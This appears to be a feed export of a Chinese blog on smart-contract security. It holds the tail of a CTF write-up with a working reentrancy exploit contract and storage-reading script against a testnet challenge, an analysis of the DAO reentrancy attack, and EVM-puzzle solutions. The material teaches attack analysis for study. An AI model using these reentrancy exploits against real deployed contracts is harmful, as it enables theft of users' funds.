require(balanceOf[msg.sender]-value&gt;=0);</span><br><span class="line">        balanceOf[msg.sender]-=value;</span><br><span class="line">        balanceOf[to]+=value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题类似在<code>fate()</code>函数处存在溢出，但是要求满足<code>require(balanceOf[msg.sender]-value&gt;=0);</code>在<code>ubw()</code>函数中，<strong>else</strong> 缺少条件，所以可以执行<code>else</code>中的代码使得<code>n.nodeadress=msg.sender;</code>，然后执行<code>balanceOf[msg.sender]-=value;</code>造成溢出。</p><p>解题步骤为：</p><ol><li>执行<code> ubw()</code>函数且<strong>msg.value &gt; 2 ether</strong>，使<code>n.nodeadress=msg.sender;</code></li><li>执行<code>fate()</code>函数，**msg.value &gt; 0 **；</li></ol><h3 id="reentrancy"><a href="#reentrancy" class="headerlink" title="reentrancy"></a>reentrancy</h3><h4 id="babybank"><a href="#babybank" class="headerlink" title="babybank"></a>babybank</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public level;</span><br><span class="line">    address owner;</span><br><span class="line">    uint secret;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 1 </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(level[msg.sender]==0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff==0xb1b1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 2</span><br><span class="line">    function set_secret(uint new_secret) public onlyOwner&#123;</span><br><span class="line">        secret=new_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint guess_secret) public&#123;</span><br><span class="line">        require(guess_secret==secret);</span><br><span class="line">        require(level[msg.sender]==1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 3</span><br><span class="line">    function transfer(address to, uint amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(level[msg.sender]==2);</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">        balance[to] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*100000000000000)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>challenge1 中可以使账户余额加 1，但是需要满足条件，即外部账号以<code>0xb1b1</code>结尾，可以对账户进行爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ethereum <span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa1</span>():</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> addr.lower().endswith(<span class="string">&quot;b1b1&quot;</span>):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(addr, priv.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with the ability to deploy contract with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa2</span>():</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> utils.decode_addr(utils.mk_contract_address(addr, <span class="number">0</span>)).endswith(<span class="string">&quot;1b1b&quot;</span>):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(addr, priv.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        generate_eoa1()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        generate_eoa2()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter valid argument&quot;</span>)</span><br></pre></td></tr></table></figure><p>而 secret 可以利用 web3js 在storage获取。</p><p>在<code>withdraw</code>函数中存在重入漏洞，但是要执行该函数需要满足<code>require(balance[msg.sender] &gt;= amount);</code>，在调用完<code>profit</code>和<code>guess</code>函数后的<code>balance[msg.sender]== 2</code>，可以通过<code>withdraw</code>的检查，但是由于合约中没有余额，所以需要<code>selfdestruct</code>函数强制转入俩个 ether。</p><p>攻击合约：</p><p>也可以在 <a href="https://vanity-eth.tk/">https://vanity-eth.tk/</a> 生成满足条件的账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit&#123;</span><br><span class="line">    address babybank_addr = 0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c;</span><br><span class="line">    uint flag = 0;</span><br><span class="line">    babybank public hack;</span><br><span class="line">  </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        hack = babybank(babybank_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        hack.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable public&#123;</span><br><span class="line">        if (flag == 0)&#123;</span><br><span class="line">            flag = 1;</span><br><span class="line">            hack.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        hack.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用生成的账户调用<code>profit</code>函数，在使用 webpy 获取到 slot 2中的 secret 的值后调用<code>guess</code>函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, EthereumTesterProvider</span><br><span class="line"></span><br><span class="line">web = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://ropsten.infura.io/v3/token&#x27;</span>))</span><br><span class="line">checkConnect = web.isConnected()</span><br><span class="line">web3 = web.eth</span><br><span class="line">address = <span class="string">&quot;0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c&quot;</span></span><br><span class="line">st = Web3.toHex(web3.get_storage_at(address, <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(st)</span><br><span class="line"></span><br><span class="line">//<span class="number">0x0000000000000000000000000000000000000000000000000003fde42988fa35</span></span><br></pre></td></tr></table></figure><p>此时生成的账户中的 <code>balance[EOA] == 2</code>，然后部署攻击合约，调用 <code>transfer</code>函数，使<code>balacne[Exploit]== 2</code>，然后在调用攻击合约的 <code>withdraw</code>函数，在攻击合约第一次接收到转账时发生重入，然后利用溢出漏洞达到获取到flag的条件。</p><h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><h4 id="Happy-DOuble-Eleven"><a href="#Happy-DOuble-Eleven" class="headerlink" title="Happy_DOuble_Eleven"></a>Happy_DOuble_Eleven</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">interface Tmall &#123;</span><br><span class="line">    function Chop_hand(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Happy_DOuble_Eleven &#123;</span><br><span class="line">    </span><br><span class="line">    address public owner;</span><br><span class="line">    bool public have_money;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    bool public have_chopped;</span><br><span class="line">    uint public hand;</span><br><span class="line">    </span><br><span class="line">    mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping (address =&gt; uint) public mycart;</span><br><span class="line">    mapping (address =&gt; uint) public level;</span><br><span class="line">    </span><br><span class="line">    event pikapika_SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) onlyOwner public &#123;</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(mycart[msg.sender] &gt; 10000000000000000000);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        level[msg.sender] = 0;</span><br><span class="line">        have_chopped = false;</span><br><span class="line">        have_money = false;</span><br><span class="line">        codex.length = 0;</span><br><span class="line">        emit pikapika_SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier first() &#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">        require(_to != address(0x0));</span><br><span class="line">        require(_value &gt; 0);</span><br><span class="line">        </span><br><span class="line">        uint256 oldFromBalance = balanceOf[_from];</span><br><span class="line">        uint256 oldToBalance = balanceOf[_to];</span><br><span class="line">        </span><br><span class="line">        uint256 newFromBalance =  balanceOf[_from] - _value;</span><br><span class="line">        uint256 newToBalance =  balanceOf[_to] + _value;</span><br><span class="line">        </span><br><span class="line">        require(oldFromBalance &gt;= _value);</span><br><span class="line">        require(newToBalance &gt; oldToBalance);</span><br><span class="line">        </span><br><span class="line">        balanceOf[_from] = newFromBalance;</span><br><span class="line">        balanceOf[_to] = newToBalance;</span><br><span class="line">        </span><br><span class="line">        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        _transfer(msg.sender, _to, _value); </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Deposit() public payable &#123;</span><br><span class="line">        if(msg.value &gt;= 500 ether)&#123;</span><br><span class="line">            mycart[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function gift() first &#123;</span><br><span class="line">        require(mycart[msg.sender] == 0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        balanceOf[msg.sender] = 100;</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function Chopping(uint _hand) public &#123;</span><br><span class="line">        Tmall tmall = Tmall(msg.sender);</span><br><span class="line">        </span><br><span class="line">        if (!tmall.Chop_hand(_hand)) &#123;</span><br><span class="line">            hand = _hand;</span><br><span class="line">            have_chopped = tmall.Chop_hand(hand);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint num) public &#123;</span><br><span class="line">        uint seed = uint(blockhash(block.number - 1));</span><br><span class="line">        uint rand = seed % 3;</span><br><span class="line">        if (rand == num) &#123;</span><br><span class="line">            have_money = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        require(level[msg.sender] == 1);</span><br><span class="line">        require(mycart[msg.sender] == 1);</span><br><span class="line">        require(have_chopped == true);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function retract() public &#123;</span><br><span class="line">        require(codex.length == 0);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex.length -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function revise(uint i, bytes32 _person) public &#123;</span><br><span class="line">        require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex[i] = _person;</span><br><span class="line">        if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123;</span><br><span class="line">            codex.length = 0;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            level[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) onlyOwner public &#123;</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(_amount &gt;= 100);</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">        require(address(this).balance &gt;= _amount);</span><br><span class="line">        balanceOf[msg.sender] -= _amount;</span><br><span class="line">        msg.sender.call.value(_amount)();</span><br><span class="line">        mycart[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>payforlag</code>函数中是获取flag的条件，要求<code>msg.sender</code>的低位为<code>0x111</code>，<code>lelve[msgs.sender] == 3</code>，且账户的余额大于 10000000000000000000。</p><p><code>Deposit</code>函数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;integer-overflow&quot;&gt;&lt;a href=&quot;#integer-overflow&quot; class=&quot;headerlink&quot; title=&quot;integer overflow&quot;&gt;&lt;/a&gt;integer overflow&lt;/h3&gt;&lt;h4 id=&quot;bet&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="智能合约 CTF" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CTF/"/>
    
  </entry>
  
  <entry>
    <title>The Dao 事件分析</title>
    <link href="https://banana69.site/2022/07/29/RaceToEmpty%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://banana69.site/2022/07/29/RaceToEmpty%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
    <published>2022-07-29T08:55:14.000Z</published>
    <updated>2022-07-29T10:30:55.208Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Race-To-Empty-攻击简介"><a href="#Race-To-Empty-攻击简介" class="headerlink" title="Race To Empty 攻击简介"></a>Race To Empty 攻击简介</h3><p>Race To Empty 就是使用多次且快速调用代码的方式使被攻击者账户中的资产为空的一种攻击方式，利用 <code>fallback()</code>函数使受害者递归调用转账函数，也就是我们现在说的重入攻击 </p><p>举个例子来理解：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawBalance() &#123;  </span><br><span class="line">  amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">  if (!(msg.sender.call.value(amountToWithdraw)())) &#123; </span><br><span class="line">  throw;</span><br><span class="line">  &#125;</span><br><span class="line">  userBalances[msg.sender] = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一个普通的取款函数，在被调用时会执行以下操作</p><ol><li>获取记录的余额<code>userBalances[msg.sender]</code></li><li>将获取到的余额发送，若发送不成功则抛出异常</li><li>将 <code>msg.sender</code>的余额置为 0</li></ol><p>以上操作看起来没有任何问题，实际上在智能合约上执行时，转账接收者在合约中可以写一段恶意代码，比如像这样的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function () &#123;  </span><br><span class="line">  // To be called by a vulnerable contract with a withdraw function.</span><br><span class="line">  // This will double withdraw.</span><br><span class="line"></span><br><span class="line">  vulnerableContract v;</span><br><span class="line">  uint times;</span><br><span class="line">  if (times == 0 &amp;&amp; attackModeIsOn) &#123;</span><br><span class="line">    times = 1;</span><br><span class="line">    v.withdrawBalance();</span><br><span class="line"></span><br><span class="line">   &#125; else &#123; times = 0; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在每次调用<code>msg.sender.call.value()</code>就会调用默认函数，而默认函数又会去调用 <code>withdrawBalance()</code>，这样就会造成递归调用，函数调用栈如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vulnerableContract.withdrawBalance run 1</span><br><span class="line">attacker default function run 1</span><br><span class="line">vulnerableContract.withdrawBalance run 2</span><br><span class="line">attacker default function run 2</span><br></pre></td></tr></table></figure><p>当第一次调用<code>userBalances[msg.sender]</code>会正常执行下面的转账操作，当第二次调用时还为执行置 0 操作，就会不断的向攻击者转账，耗尽被攻击者的余额。</p><h3 id="The-Dao-事件中的重入攻击"><a href="#The-Dao-事件中的重入攻击" class="headerlink" title="The Dao 事件中的重入攻击"></a>The Dao 事件中的重入攻击</h3><h5 id="fallback函数"><a href="#fallback函数" class="headerlink" title="fallback函数"></a>fallback函数</h5><p>fallback 函数又被称为回退函数，每个合约具有一个没有名字的函数，当合约被调用时，如果无法匹配到有效的函数，就会默认调用 <code>fallback</code>函数；当合约接收到 ether 时 ，会退函数也会被执行。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>DAO被攻击成功主要有俩个原因：</p><ol><li>DAO余额扣除与转账顺序有误，应该先进行扣除费用再进行转账；</li><li>未知代码被无限制使用。</li></ol><p>攻击者在自己的合约中，利用 fallback 函数通过递归初查 DAO 的splitDAO 函数的多次调用。</p><p>源码分析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Modifier that allows only shareholders to vote and create new proposals</span><br><span class="line">    modifier onlyTokenholders &#123;</span><br><span class="line">        if (balanceOf(msg.sender) == 0) throw;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面的代码对 <code>msg.sender</code>持有的 dao token 进行判断，当余额为 0 时会抛出异常。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Move ether and assign new Tokens</span><br><span class="line">uint fundsToBeMoved =(balances[msg.sender] * p.splitData[0].splitBalance) / p.splitData[0].totalSupply;</span><br><span class="line">if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)</span><br><span class="line">throw;</span><br></pre></td></tr></table></figure><p>在 DAO.sol 中的 splitDao可以找到向 childDAo 转账的代码，它会将代币从 the parent DAO 转移到 the child DAO中。攻击者就是利用这条语句来获取更多的代币并转移到 child DAO 中。</p><p><strong>fundsToBeMoved</strong> 的作用是决定了要转移的代币的数量，因为攻击者每次调用时 <code>p.splitData[0]</code>都是一样的，并且<code>p.splitData[0].totalSupply</code>与<code>balances[msg.sender]</code>的值由于函数顺序问题没有被更新。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Burn DAO Tokens</span><br><span class="line">Transfer(msg.sender, 0, balances[msg.sender]);</span><br><span class="line">withdrawRewardFor(msg.sender); // be nice, and get his rewards</span><br><span class="line">totalSupply -= balances[msg.sender];</span><br><span class="line">balances[msg.sender] = 0;</span><br><span class="line">paidOut[msg.sender] = 0;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure><p>所以要想实现不断的转账操作，就必须依靠其他方法，根据上面的代码，为msg.sender记录的dao币余额归零、扣减 dao token 总量totalSupply等等都发生在将token转入msg.sender之后。下面看<code>withdrawRewardFor)()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawRewardFor(address _account) noEther internal returns (bool _success) &#123;</span><br><span class="line">if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply &lt; paidOut[_account])</span><br><span class="line">throw;</span><br><span class="line">uint reward =(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];</span><br><span class="line">if (!rewardAccount.payOut(_account, reward))</span><br><span class="line">throw;</span><br><span class="line">  paidOut[_account] += reward;</span><br><span class="line">  return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>paidOut[_account] += reward</code>在问题代码里面放在payOut函数调用之后，再看payOut函数调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function payOut(address _recipient, uint _amount) returns (bool) &#123;</span><br><span class="line">        if (msg.sender != owner || msg.value &gt; 0 || (payOwnerOnly &amp;&amp; _recipient != owner))</span><br><span class="line">            throw;</span><br><span class="line"></span><br><span class="line">        if (_recipient.call.value(_amount)()) &#123;    //注意这一行</span><br><span class="line"></span><br><span class="line">            PayOut(_recipient, _amount);</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对_recipient发出call调用，转账_amount个Wei，call调用默认会使用当前剩余的所有gas。</p><p>以上就是 DAO 事件的代码分析。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Race-To-Empty-攻击简介&quot;&gt;&lt;a href=&quot;#Race-To-Empty-攻击简介&quot; class=&quot;headerlink&quot; title=&quot;Race To Empty 攻击简介&quot;&gt;&lt;/a&gt;Race To Empty 攻击简介&lt;/h3&gt;&lt;p&gt;Race T</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Evm-puzzles题解</title>
    <link href="https://banana69.site/2022/07/28/evm-puzzles/"/>
    <id>https://banana69.site/2022/07/28/evm-puzzles/</id>
    <published>2022-07-27T16:00:00.000Z</published>
    <updated>2022-07-28T07:01:08.830Z</updated>
    
    <content type="html"><![CDATA[<p>Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制</p><p><img src="/image/evm-puzzles.assets/1.png" alt="1"></p><h3 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 1 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: (0)</span><br></pre></td></tr></table></figure><p>这道题提示需要输入一个发送的值，即向这个合约发送一笔交易，这个交易需要多少value才能不处罚 REVERT指令。</p><p>首先需要了解 CALLVALUE 指令，此操作会获取到负责此执行的指令/交易的值，并将该值推到堆栈的顶部，如果输入10，则在 CALLVALUE 指令执行后，堆栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">10</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>而 JUMP 的指令的作用是更改程序计数器，使栈顶的值 n 出栈，并跳转到第 n 条执行，JUMP 执行的跳转必须以 JUMPDEST 指令结束。</p><p>所以要想通过这道题，只需要输入 value 为8，CALLVALUE 指令将 8 压入栈顶，栈中结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当执行到 JUMP 指令时栈顶的值为 8，然后跳转到第 8 条指令即 JUMPDEST，跳过所有 REVERT指令。</p><h3 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 2 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      38      CODESIZE</span><br><span class="line">02      03      SUB</span><br><span class="line">03      56      JUMP</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      5B      JUMPDEST</span><br><span class="line">07      00      STOP</span><br><span class="line">08      FD      REVERT</span><br><span class="line">09      FD      REVERT</span><br></pre></td></tr></table></figure><p>这道题依然需要输入一个值，使程序在不执行 REVERT 指令的前提下运行。首先需要了解 CODESIZE 指令，此操作码获取在当前环境中运行的代码的大小。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Add some instructions to increase the code size</span></span><br><span class="line">PUSH29 <span class="number">0</span></span><br><span class="line">POP</span><br><span class="line">CODESIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">//stack =&gt; 20</span></span><br></pre></td></tr></table></figure><p>puzzle2 中，可以通过查看序列有多少操作码来手动剪擦好代码的大小，每个操作码的大小是 1 byte，所以10个操作码的大小一共是 10 byte，而 EVM 中使用十六进制表示，即 0a 被压入栈顶。</p><p>SUB 指令是用栈顶元素的值减去栈中的第二个元素的值，然后将结果压入栈中，向上一题一样，如果需要跳过REVERT 指令，则需要跳转到第6条指令，由于在执行 CODESIZE 后栈顶元素的值为 0a（10） ，所以只需要使输入的值为4时，在执行 JUMP 前，栈顶元素的值为 6，即跳转到 JUMPDEST，完成该题目。</p><h3 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 3 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36      CALLDATASIZE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      5B      JUMPDEST</span><br><span class="line">05      00      STOP</span><br></pre></td></tr></table></figure><p>这道题目中的操作码与之前基本一致，但是需要我们输入的不是交易时的 <strong>value</strong>，而是 <strong>calldata</strong>，即附加到 message 中的字节码。<code>args</code>也叫<code>calldata</code>，Calldata是不可修改的非持久性数据位置，所有传递给函数的值都存储在这里。与栈不同的地方的是，如果要使用calldata里面的数据，必须手动指定偏移量和读取的字节数，Calldata是外部函数的参数(而不是返回参数)的默认位置。（关于 calldata 可以参考<a 